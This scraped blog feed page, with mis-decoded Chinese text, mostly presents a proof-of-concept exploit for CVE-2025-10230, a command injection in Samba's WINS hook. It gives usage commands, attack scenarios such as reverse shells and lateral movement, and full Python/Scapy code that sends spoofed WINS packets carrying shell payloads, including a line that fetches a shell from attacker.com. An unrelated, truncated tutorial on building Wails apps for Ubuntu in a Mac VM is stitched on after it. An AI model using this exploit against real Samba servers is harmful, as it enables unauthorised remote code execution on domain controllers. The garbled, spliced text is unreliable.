pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Samba WINS æ¼æ´åˆ©ç”¨ä¸é˜²å¾¡å…¨è§£æ</h2>
<h3 data-id="heading-1">é¡¹ç›®æ ‡é¢˜ä¸æè¿°</h3>
<p>CVE-2025-10230 PoC - Samba WINS Hook å‘½ä»¤æ³¨å…¥æ¼æ´éªŒè¯å·¥å…·</p>
<p>æœ¬é¡¹ç›®æ˜¯ä¸€ä¸ªé’ˆå¯¹CVE-2025-10230æ¼æ´çš„æ¦‚å¿µéªŒè¯(PoC)è„šæœ¬ã€‚è¯¥æ¼æ´å­˜åœ¨äºSambaçš„WINS hookå¤„ç†æœºåˆ¶ä¸­ï¼Œå½“Sambaä½œä¸ºADåŸŸæ§åˆ¶å™¨å¹¶å¯ç”¨WINSæ”¯æŒæ—¶ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ³¨å…¥æ¶æ„NetBIOSåç§°æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<p><strong>å…³é”®ä¿¡æ¯ï¼š</strong></p>
<ul>
<li><strong>ä¸¥é‡ç¨‹åº¦</strong>ï¼šCRITICAL (CVSS 3.1: 10.0)</li>
<li><strong>æ¼æ´ç±»å‹</strong>ï¼šæœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ(RCE) via å‘½ä»¤æ³¨å…¥</li>
<li><strong>å—å½±å“ç‰ˆæœ¬</strong>ï¼šSamba 4.0+ ä½œä¸ºADåŸŸæ§åˆ¶å™¨ï¼Œä¸”å¯ç”¨äº†WINSå’Œwins hook</li>
<li><strong>å‘ç°æ—¶é—´</strong>ï¼š2025å¹´10æœˆç”±Igor MorgensternæŠ¥å‘Š</li>
</ul>
<h3 data-id="heading-2">åŠŸèƒ½ç‰¹æ€§</h3>
<h4 data-id="heading-3">æ ¸å¿ƒåŠŸèƒ½</h4>
<ul>
<li><strong>æ¶æ„æ•°æ®åŒ…æ„é€ </strong>ï¼šè‡ªåŠ¨ç”ŸæˆåŒ…å«æ³¨å…¥payloadçš„WINSæ³¨å†Œè¯·æ±‚æ•°æ®åŒ…</li>
<li><strong>NetBIOSåç§°æ³¨å…¥</strong>ï¼šé€šè¿‡æœªç»éªŒè¯çš„NetBIOSåç§°å­—æ®µæ³¨å…¥Shellå‘½ä»¤</li>
<li><strong>Scapyé›†æˆ</strong>ï¼šä½¿ç”¨Scapyåº“æ„å»ºå’Œå‘é€è‡ªå®šä¹‰UDPæ•°æ®åŒ…</li>
<li><strong>å‚æ•°åŒ–payload</strong>ï¼šæ”¯æŒè‡ªå®šä¹‰Shellå‘½ä»¤ä½œä¸ºæ³¨å…¥payload</li>
</ul>
<h4 data-id="heading-4">æŠ€æœ¯ç‰¹ç‚¹</h4>
<ul>
<li><strong>åè®®æ¨¡æ‹Ÿ</strong>ï¼šæ¨¡æ‹ŸRFC 1002å…¼å®¹çš„WINSåç§°æ³¨å†Œåè®®</li>
<li><strong>IPæ¬ºéª—æ”¯æŒ</strong>ï¼šå¯æŒ‡å®šæºIPåœ°å€è¿›è¡Œæ•°æ®åŒ…ä¼ªé€ </li>
<li><strong>è¯¦ç»†è¾“å‡º</strong>ï¼šæä¾›æ‰§è¡Œè¿‡ç¨‹çš„è¯¦ç»†çŠ¶æ€ä¿¡æ¯å’Œé¢„æœŸæ•ˆæœ</li>
<li><strong>é”™è¯¯å¤„ç†</strong>ï¼šåŒ…å«åŸºæœ¬çš„å¼‚å¸¸å¤„ç†å’Œç”¨æˆ·åé¦ˆ</li>
</ul>
<h4 data-id="heading-5">ä½¿ç”¨åœºæ™¯</h4>
<ul>
<li>å®‰å…¨ç ”ç©¶äººå‘˜éªŒè¯æ¼æ´å­˜åœ¨æ€§</li>
<li>æ¸—é€æµ‹è¯•äººå‘˜è¯„ä¼°Sambaç¯å¢ƒå®‰å…¨æ€§</li>
<li>å®‰å…¨è¿ç»´äººå‘˜ç†è§£æ”»å‡»åŸç†ä»¥åŠ å¼ºé˜²å¾¡</li>
<li>æ•™è‚²åŸ¹è®­ä¸­çš„ç½‘ç»œå®‰å…¨å®éªŒç¯å¢ƒ</li>
</ul>
<h3 data-id="heading-6">å®‰è£…æŒ‡å—</h3>
<h4 data-id="heading-7">ç³»ç»Ÿè¦æ±‚</h4>
<ul>
<li>Python 3.x</li>
<li>Root/sudoæƒé™ï¼ˆç”¨äºåŸå§‹å¥—æ¥å­—è®¿é—®ï¼‰</li>
<li>Linux/Unixæ“ä½œç³»ç»Ÿ</li>
</ul>
<h4 data-id="heading-8">ä¾èµ–å®‰è£…</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£…Scapyç½‘ç»œæ•°æ®åŒ…æ“ä½œåº“</span>
pip install scapy

<span class="hljs-comment"># æˆ–é€šè¿‡ç³»ç»ŸåŒ…ç®¡ç†å™¨</span>
sudo apt-get install python3-scapy  <span class="hljs-comment"># Debian/Ubuntu</span>
sudo yum install python3-scapy      <span class="hljs-comment"># RHEL/CentOS</span>
</code></pre>
<h4 data-id="heading-9">å®‰è£…æ­¥éª¤</h4>
<ol>
<li>å…‹éš†æˆ–ä¸‹è½½æœ¬PoCè„šæœ¬</li>
<li>ç¡®ä¿å…·æœ‰æ‰§è¡Œæƒé™ï¼š
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">chmod</span> +x CVE-2025-10230.py
</code></pre>
</li>
<li>ä½¿ç”¨rootæƒé™è¿è¡Œï¼ˆéœ€è¦åŸå§‹å¥—æ¥å­—ï¼‰ï¼š
<pre><code class="hljs language-bash" lang="bash">sudo python3 CVE-2025-10230.py &lt;target_ip&gt;
</code></pre>
</li>
</ol>
<h4 data-id="heading-10">å¹³å°æ³¨æ„äº‹é¡¹</h4>
<ul>
<li>ä»…åœ¨Linux/Unixç³»ç»Ÿä¸Šæµ‹è¯•</li>
<li>éœ€è¦é…ç½®æ­£ç¡®çš„ç½‘ç»œæ¥å£ï¼ˆé»˜è®¤ä¸ºeth0ï¼‰</li>
<li>ç›®æ ‡ç³»ç»Ÿå¿…é¡»è¿è¡Œæ˜“å—æ”»å‡»çš„Sambaé…ç½®</li>
<li><strong>é‡è¦</strong>ï¼šä»…åœ¨æˆæƒçš„æµ‹è¯•ç¯å¢ƒä¸­ä½¿ç”¨</li>
</ul>
<h3 data-id="heading-11">ä½¿ç”¨è¯´æ˜</h3>
<h4 data-id="heading-12">åŸºç¡€ç”¨æ³•</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æœ€åŸºæœ¬ç”¨æ³•ï¼šå‘ç›®æ ‡å‘é€é»˜è®¤payload</span>
sudo python3 CVE-2025-10230.py 192.168.1.10

<span class="hljs-comment"># ä½¿ç”¨è‡ªå®šä¹‰payload</span>
sudo python3 CVE-2025-10230.py 192.168.1.10 --payload <span class="hljs-string">"; wget http://attacker.com/shell -O /tmp/shell"</span>

<span class="hljs-comment"># æŒ‡å®šæºIPå’Œå¯ç”¨è¯¦ç»†è¾“å‡º</span>
sudo python3 CVE-2025-10230.py 192.168.1.10 --src_ip 192.168.1.100 --verbose
</code></pre>
<h4 data-id="heading-13">å‚æ•°è¯´æ˜</h4>
<ul>
<li><code>target_ip</code>ï¼šæ˜“å—æ”»å‡»çš„Samba ADåŸŸæ§åˆ¶å™¨IPåœ°å€ï¼ˆå¿…éœ€ï¼‰</li>
<li><code>--payload</code>ï¼šè¦æ³¨å…¥çš„Shellå‘½ä»¤ï¼ˆé»˜è®¤ï¼š<code>; id &gt; /tmp/injected_by_cve.txt 2&gt;&amp;1</code>ï¼‰</li>
<li><code>--src_ip</code>ï¼šæ•°æ®åŒ…ä¸­ä½¿ç”¨çš„ä¼ªé€ æºIPï¼ˆé»˜è®¤ï¼š192.168.1.100ï¼‰</li>
<li><code>--verbose</code>ï¼šå¯ç”¨Scapyçš„è¯¦ç»†è¾“å‡ºæ¨¡å¼</li>
</ul>
<h4 data-id="heading-14">éªŒè¯ç»“æœ</h4>
<p>æˆåŠŸåˆ©ç”¨åï¼Œæ£€æŸ¥ç›®æ ‡ç³»ç»Ÿï¼š</p>
<ol>
<li>æŸ¥çœ‹å‘½ä»¤æ‰§è¡Œç»“æœï¼š
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /tmp/injected_by_cve.txt
</code></pre>
</li>
<li>æ£€æŸ¥Sambaæ—¥å¿—ï¼š
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">tail</span> -f /var/log/samba/log.smbd
</code></pre>
</li>
</ol>
<h4 data-id="heading-15">å…¸å‹æ”»å‡»åœºæ™¯</h4>
<ol>
<li><strong>ä¿¡æ¯æ”¶é›†</strong>ï¼šæ‰§è¡Œ<code>id</code>ã€<code>whoami</code>ç­‰å‘½ä»¤è·å–ç³»ç»Ÿä¿¡æ¯</li>
<li><strong>æŒä¹…åŒ–è®¿é—®</strong>ï¼šä¸‹è½½å¹¶æ‰§è¡Œåå‘Shell</li>
<li><strong>æƒé™æå‡</strong>ï¼šåˆ©ç”¨ç³»ç»Ÿæ¼æ´è·å–rootæƒé™</li>
<li><strong>æ¨ªå‘ç§»åŠ¨</strong>ï¼šä»åŸŸæ§åˆ¶å™¨æ”»å‡»åŸŸå†…å…¶ä»–ç³»ç»Ÿ</li>
</ol>
<h3 data-id="heading-16">æ ¸å¿ƒä»£ç </h3>
<h4 data-id="heading-17">1. ä¸»å‡½æ•°ä¸å‚æ•°è§£æ</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
<span class="hljs-comment"># Author: B1ack4sh ==&gt; IRtmVR00ISVkJPN1GQEMZ1VtVFRu</span>
<span class="hljs-string">"""
PoC for CVE-2025-10230 - Samba WINS Hook Command Injection
===========================================================

This script demonstrates the command injection vulnerability in Samba's WINS hook
handling when running as an AD Domain Controller with WINS support enabled.

Usage:
    python3 CVE-2025-10230.py &lt;target_ip&gt; [--payload &lt;cmd&gt;] [--verbose]

Requirements:
    - scapy (pip install scapy)
    - Run as root/sudo for raw socket access

Vulnerability:
    Unsanitized NetBIOS names in WINS registrations are passed to the 'wins hook'
    script, allowing command injection via shell metacharacters.

Author: dptsec (based on Samba advisory)
License: For educational/testing purposes only.
âš ï¸  DO NOT USE ON PRODUCTION SYSTEMS!
"""</span>

<span class="hljs-keyword">import</span> argparse
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> IP, UDP, send, Raw, sr1
<span class="hljs-keyword">from</span> scapy.layers.inet <span class="hljs-keyword">import</span> IP <span class="hljs-keyword">as</span> IP_scapy
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> struct
</code></pre>
<h4 data-id="heading-18">2. WINSæ³¨å†Œæ•°æ®åŒ…æ„é€ å‡½æ•°</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">craft_wins_registration_packet</span>(<span class="hljs-params">nb_name: <span class="hljs-built_in">str</span>, src_ip: <span class="hljs-built_in">str</span> = <span class="hljs-string">"127.0.0.1"</span>, target_ip: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span></span>):
    <span class="hljs-string">"""
    Crafts a WINS Name Registration Request packet with injected NB name.
    
    WINS Protocol (RFC 1002 compliant, simplified for registration).
    OpCode: 0x0B (Register)
    NB Name: Padded to 15 chars + null, but injection via trailing metachars.
    """</span>
    <span class="hljs-comment"># Transaction ID (arbitrary)</span>
    transaction_id = struct.pack(<span class="hljs-string">'&gt;H'</span>, <span class="hljs-number">0x1234</span>)
    
    <span class="hljs-comment"># Flags: Standard query (0x0000), OpCode Register (0x0B in high bits, but simplified)</span>
    flags = struct.pack(<span class="hljs-string">'&gt;H'</span>, <span class="hljs-number">0x000B</span>)  <span class="hljs-comment"># B-node, Register</span>
    
    <span class="hljs-comment"># Questions: 1</span>
    questions = struct.pack(<span class="hljs-string">'&gt;H'</span>, <span class="hljs-number">1</span>)
    <span class="hljs-comment"># Answer RRs: 0</span>
    answer_rrs = struct.pack(<span class="hljs-string">'&gt;H'</span>, <span class="hljs-number">0</span>)
    <span class="hljs-comment"># Authority RRs: 0</span>
    authority_rrs = struct.pack(<span class="hljs-string">'&gt;H'</span>, <span class="hljs-number">0</span>)
    <span class="hljs-comment"># Additional RRs: 0</span>
    additional_rrs = struct.pack(<span class="hljs-string">'&gt;H'</span>, <span class="hljs-number">0</span>)
    
    <span class="hljs-comment"># Header</span>
    header = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs
    
    <span class="hljs-comment"># Question Section: NetBIOS Name</span>
    <span class="hljs-comment"># NB Name encoding: 18 chars of 0xC0 (labels) + length + name chars (0x41 base32-ish, but raw for injection)</span>
    <span class="hljs-comment"># For vuln: Use raw string with shell chars â€“ vuln doesn't validate.</span>
    nb_raw = nb_name.encode(<span class="hljs-string">'ascii'</span>)[:<span class="hljs-number">15</span>].ljust(<span class="hljs-number">15</span>, <span class="hljs-string">b'\x00'</span>)  <span class="hljs-comment"># Truncate/pad to 15</span>
    nb_section = <span class="hljs-string">b'\xC0'</span> * <span class="hljs-number">2</span> + struct.pack(<span class="hljs-string">'B'</span>, <span class="hljs-built_in">len</span>(nb_raw)) + nb_raw + <span class="hljs-string">b'\x00'</span>  <span class="hljs-comment"># Compressed pointer hack + name</span>
    
    <span class="hljs-comment"># QType: NB (0x0020), QClass: IN (0x0001)</span>
    qtype = struct.pack(<span class="hljs-string">'&gt;H'</span>, <span class="hljs-number">0x0020</span>)
    qclass = struct.pack(<span class="hljs-string">'&gt;H'</span>, <span class="hljs-number">0x0001</span>)
    
    question = nb_section + qtype + qclass
    
    <span class="hljs-comment"># No answers for registration request</span>
    packet_payload = header + question
    
    <span class="hljs-comment"># Wrap in UDP/IP</span>
    ip_layer = IP_scapy(src=src_ip, dst=target_ip)
    udp_layer = UDP(sport=<span class="hljs-number">137</span>, dport=<span class="hljs-number">42</span>)  <span class="hljs-comment"># NBNS src, WINS dst (UDP/42 for WINS)</span>
    full_packet = ip_layer / udp_layer / Raw(load=packet_payload)
    
    <span class="hljs-keyword">return</span> full_packet
</code></pre>
<h4 data-id="heading-19">3. ä¸»æ‰§è¡Œæµç¨‹</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    parser = argparse.ArgumentParser(description=<span class="hljs-string">"CVE-2025-10230 PoC - Samba WINS Injection"</span>)
    parser.add_argument(<span class="hljs-string">"target_ip"</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">"IP of vulnerable Samba AD DC"</span>)
    parser.add_argument(<span class="hljs-string">"--payload"</span>, default=<span class="hljs-string">"; id &gt; /tmp/injected_by_cve.txt 2&gt;&amp;1"</span>, 
                        <span class="hljs-built_in">help</span>=<span class="hljs-string">"Shell command to inject (appended after fake NB name)"</span>)
    parser.add_argument(<span class="hljs-string">"--src_ip"</span>, default=<span class="hljs-string">"192.168.1.100"</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">"Spoofed source IP in packet"</span>)
    parser.add_argument(<span class="hljs-string">"--verbose"</span>, <span class="hljs-string">"-v"</span>, action=<span class="hljs-string">"store_true"</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">"Verbose Scapy output"</span>)
    args = parser.parse_args()
    
    <span class="hljs-comment"># Construct malicious NB name: Fake + payload (keep NB part short)</span>
    fake_nb = <span class="hljs-string">"POC-"</span>  <span class="hljs-comment"># Legit-looking prefix</span>
    malicious_name = fake_nb + args.payload[:<span class="hljs-number">10</span>]  <span class="hljs-comment"># Truncate to fit ~15 char NB limit, but vuln allows overflow-ish</span>
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ”¥ CVE-2025-10230 PoC Launching..."</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ¯ Target: <span class="hljs-subst">{args.target_ip}</span> (UDP/42 - WINS)"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ’‰ Malicious NB Name: '<span class="hljs-subst">{malicious_name}</span>'"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ“ Expected on Target: Execution of '<span class="hljs-subst">{args.payload}</span>' via hook script"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ•µï¸  Post-exploit: Check target /tmp/injected_by_cve.txt or /var/log/samba/log.smbd"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">60</span>)
    
    <span class="hljs-keyword">try</span>:
        pkt = craft_wins_registration_packet(malicious_name, args.src_ip, args.target_ip)
        send(pkt, verbose=args.verbose, iface=<span class="hljs-string">"eth0"</span>)  <span class="hljs-comment"># Adjust iface if needed</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ’¥ Packet sent! If vulnerable, hook should fire. Monitor target logs/FS. ğŸš¨"</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"âŒ Error sending packet: <span class="hljs-subst">{e}</span>"</span>)
        sys.exit(<span class="hljs-number">1</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"Usage: sudo python3 CVE-2025-10230.py &lt;target_ip&gt; [--payload ';cmd']"</span>)
        sys.exit(<span class="hljs-number">1</span>)
    main()
</code></pre>
<p>6HFtX5dABrKlqXeO5PUv/84SoIo+TE3firf/5vX8AZ5xSrVUGT9nI1uf8R2+ZD25</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¦‚ä½•åœ¨Macä¸Šç¼–è¯‘å‡ºubuntuç‰ˆæœ¬çš„wailsåº”ç”¨ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7597709339982348328</link>    <guid>https://juejin.cn/post/7597709339982348328</guid>    <pubDate>2026-01-22T03:52:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597709339982348328" data-draft-id="7597650322409127988" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¦‚ä½•åœ¨Macä¸Šç¼–è¯‘å‡ºubuntuç‰ˆæœ¬çš„wailsåº”ç”¨ï¼Ÿ"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-22T03:52:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="èŒ«èŒ«ç¢Œç¢Œ"/> <meta itemprop="url" content="https://juejin.cn/user/430664290939080"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¦‚ä½•åœ¨Macä¸Šç¼–è¯‘å‡ºubuntuç‰ˆæœ¬çš„wailsåº”ç”¨ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/430664290939080/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    èŒ«èŒ«ç¢Œç¢Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T03:52:27.000Z" title="Thu Jan 22 2026 03:52:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç›´æ¥è¿›è¡Œäº¤å‰ç¼–è¯‘æ˜¯ä¸å¯èƒ½çš„ï¼Œæ‰§è¡Œ<code>wails build --platform linux/amd64</code>ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯ï¼š</p>
<pre><code class="hljs language-text" lang="text">...
[WARNING] Crosscompiling to Linux not currently supported.
...
</code></pre>
<p>æ›²çº¿æ•‘å›½çš„æ–¹æ¡ˆæ˜¯åœ¨Macä¸Šè£…è™šæ‹Ÿæœºï¼Œä»¥ä¸‹æ˜¯æ“ä½œæ­¥éª¤ï¼š</p>
<h3 data-id="heading-0">1ã€å®‰è£…è™šæ‹Ÿæœº</h3>
<p>æ¨è<a href="https://link.juejin.cn?target=https%3A%2F%2Forbstack.dev%2F" target="_blank" title="https://orbstack.dev/" ref="nofollow noopener noreferrer">OrbStack</a>ï¼Œè½»é‡ã€æ–¹ä¾¿</p>
<pre><code class="hljs language-bash" lang="bash">brew install orbstack
</code></pre>
<p>å®‰è£…å¥½åï¼Œæ–°å»ºä¸€ä¸ªè™šæ‹Ÿæœºï¼ˆNew Machineï¼‰ï¼Œé€‰æ‹©Archæ—¶é€‰æ‹©è‡ªå·±æƒ³è¦æ‰“åŒ…çš„ç‰ˆæœ¬ï¼ˆx86-64å¯¹åº”amd64ï¼‰</p>
<h3 data-id="heading-1">2ã€è™šæ‹Ÿæœºç¯å¢ƒå‡†å¤‡</h3>
<p>å®‰è£…ä¾èµ–</p>
<pre><code class="hljs language-bash" lang="bash">sudo apt-get install gcc libgtk3 libwebkit libwebkit2gtk-4.1-dev git
</code></pre>
<p>å®‰è£…<a href="https://link.juejin.cn?target=https%3A%2F%2Fgo.dev%2Fdoc%2Finstall" target="_blank" title="https://go.dev/doc/install" ref="nofollow noopener noreferrer">golang</a></p>
<pre><code class="hljs language-bash" lang="bash">sudo <span class="hljs-built_in">rm</span> -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.25.6.linux-amd64.tar.gz

<span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/local/go/bin
</code></pre>
<p>å®‰è£…<a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fen%2Fdownload%2Fcurrent" target="_blank" title="https://nodejs.org/en/download/current" ref="nofollow noopener noreferrer">node</a></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸‹è½½å®‰è£… nvm:</span>
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh | bash

<span class="hljs-comment"># é‡å¯ shell</span>
\. <span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.nvm/nvm.sh"</span>

<span class="hljs-comment"># ä¸‹è½½å®‰è£… Node.js:</span>
nvm install 25

<span class="hljs-comment"># æŸ¥çœ‹nodeç‰ˆæœ¬</span>
node -v

<span class="hljs-comment"># æŸ¥çœ‹npmç‰ˆæœ¬</span>
npm -v
</code></pre>
<p>å®‰è£…<a href="https://link.juejin.cn?target=https%3A%2F%2Fwails.io%2Fdocs%2Fgettingstarted%2Finstallation%2F" target="_blank" title="https://wails.io/docs/gettingstarted/installation/" ref="nofollow noopener noreferrer">wails</a></p>
